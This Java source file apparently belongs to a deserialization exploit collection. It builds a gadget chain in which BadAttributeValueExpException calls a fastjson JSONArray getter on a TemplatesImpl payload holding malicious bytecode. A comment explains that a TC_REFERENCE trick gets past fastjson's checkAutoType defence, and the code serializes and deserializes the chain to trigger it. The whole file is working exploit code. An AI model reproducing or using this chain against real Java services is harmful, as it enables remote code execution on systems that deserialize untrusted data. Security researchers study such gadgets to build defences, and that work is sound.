package org.example.gadget;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

import static org.example.CommonUtils.*;

// BadAttributeValueExpException#readObject -> getter
public class BAVE2Fastjson2Tpl {
    public static void main(String[] args) throws Exception{
        TemplatesImpl tpl1 = TemplateImplWithoutAbstractTranslet.getPayload(null);
        JSONArray json = new JSONArray();
        json.add(tpl1);
        BadAttributeValueExpException bave = new BadAttributeValueExpException(null);
        setFieldValue(bave, "val", json);

        // 使用TC_REFERENCE绕过fastjson反序列化时checkAutoType的检查
        // https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8
        HashMap map = new HashMap<>();
        map.put(tpl1, bave);

        byte[] bytes = serialize(map);
        unserialize(bytes);



    }

}